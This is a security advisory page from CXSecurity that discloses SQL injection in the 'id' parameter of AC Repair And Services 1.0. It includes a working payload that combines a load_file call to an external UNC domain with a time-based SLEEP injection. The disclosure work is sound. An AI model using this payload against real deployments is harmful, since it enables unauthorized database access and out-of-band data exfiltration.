---
title: AC Repair And Services 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023050010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-04
fetch_date: 2025-10-04T11:36:42.348985
---

# AC Repair And Services 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AC Repair And Services 1.0 SQL Injection** **2023.05.03**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: AC Repair and Services-2023-1.0 Multiple-SQLi
## Author: nu11secur1ty
## Date: 05.01.2023
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-acrss.zip
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `id` parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load\_file('\\\\ik6wj36vs4uyp5d7amwk4tdsdjjc739r0uolbcz1.namaikatiputkatatupa.com\\cbc'))+'
was submitted in the id parameter. This payload injects a SQL
sub-query that calls MySQL's load\_file function with a UNC file path
that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed.
STATUS: HIGH Vulnerability
[+]Payload:
```mysql
---
Parameter: id (GET)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: page=services/view\_service&id=1'+(select
load\_file('\\\\ik6wj36vs4uyp5d7amwk4tdsdjjc739r0uolbcz1.namaikatiputkatatupa.com\\cbc'))+''
AND (SELECT 6992 FROM (SELECT(SLEEP(3)))eeOg) AND 'PsSH'='PsSH
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/2023/AC-Repair-and-Services-2023-1.0)
## Proof and Exploit:
[href](https://streamable.com/pfigvu)
## Time spend:
01:00:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top